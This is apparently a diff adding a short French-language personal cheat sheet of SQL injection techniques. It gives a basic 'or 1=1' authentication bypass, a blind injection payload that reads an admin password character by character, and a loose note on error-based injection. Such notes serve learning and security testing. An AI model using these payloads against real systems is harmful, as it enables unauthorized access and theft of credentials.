@@ -1,0 +1,6 @@
+Basic = yolo' or 1=1 -- -
+Blind = admin' and (select left(password,1) from users where name='admin')='3'-- -
+        # left ressort du début de la chaine password jusqu'a valeurs specifié
+        # ex : pass ="jambon" => left(password,1) = j | left(password,2) = ja
+
+Error = same que la basique avec des filtre et une sortie de l'erreur ( si non flemme go faire une database postegreSQL ou une autre connerie dans ce genre pour changé de mysql sur celui la)
